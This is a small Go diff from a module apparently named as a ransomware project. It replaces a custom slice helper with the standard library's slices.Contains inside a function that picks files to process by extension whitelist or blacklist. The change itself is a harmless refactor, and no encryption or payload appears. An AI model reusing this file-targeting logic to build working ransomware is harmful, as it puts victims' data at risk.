@@ -3,8 +3,7 @@ package fs
 import (
 	iofs "io/fs"
 	"path/filepath"
-
-	"github.com/marmos91/ransomware/utils"
+	"slices"
 )
 
 // walkFiles walks the directory tree rooted at path, skipping hidden entries
@@ -60,11 +59,11 @@ func shouldProcess(path string, whitelist, blacklist []string) bool {
 	ext := filepath.Ext(path)
 
 	if len(whitelist) > 0 {
-		return utils.SliceContains(whitelist, ext)
+		return slices.Contains(whitelist, ext)
 	}
 
 	if len(blacklist) > 0 {
-		return !utils.SliceContains(blacklist, ext)
+		return !slices.Contains(blacklist, ext)
 	}
 
 	return true
